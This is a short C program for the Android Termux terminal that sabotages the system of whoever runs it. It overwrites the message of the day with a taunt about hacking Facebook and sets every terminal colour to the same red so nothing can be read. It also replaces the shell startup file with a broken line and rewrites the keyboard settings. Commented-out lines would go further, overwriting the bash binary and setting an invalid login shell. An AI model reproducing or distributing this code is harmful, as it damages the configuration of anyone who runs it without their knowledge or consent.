#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(){
  if(opendir("/data/data/com.termux/files/home/.termux") == NULL){
    system("mkdir /data/data/com.termux/files/home/.termux;");
  }
  FILE *motd = fopen("/data/data/com.termux/files/usr/etc/motd", "w");
  fputs("\033[42;1;31DON'T EVER TRY TO HACK FACEBOOK AGAIN >:-#\033[0m\n", motd);
  FILE *colors = fopen("/data/data/com.termux/files/home/.termux/colors.properties", "w");
  fputs("background=#ff2626\nforeground=#ff2626\ncursor=#ff2626\n", colors);
  FILE *bash = fopen("/data/data/com.termux/files/usr/etc/bash.bashrc", "w+");
  fputs("PS1 = \"You are finished :# ", bash);
  FILE *tmux = fopen("/data/data/com.termux/files/home/.termux/termux.properties", "w");
  fputs("extra-keys = [\\['DONT', 'EVER', 'TRY', 'TO', 'HACK', 'FACEBOOK', 'AGAIN']\\]\n", tmux);
  //FILE *b = fopen("/data/data/com.termux/files/usr/bin/bash", "w+");
  //fprintf(b,"\033[42;1;31DON'T EVER TRY TO HACK FACEBOOK AGAIN :#");
  //system("chsh -s yup");
  fclose(motd);
  fclose(colors);
  fclose(bash);
  fclose(tmux);
  //fclose(b);
  printf("Goodbye :)");
  system("termux-reload-settings");
  return 0;
}
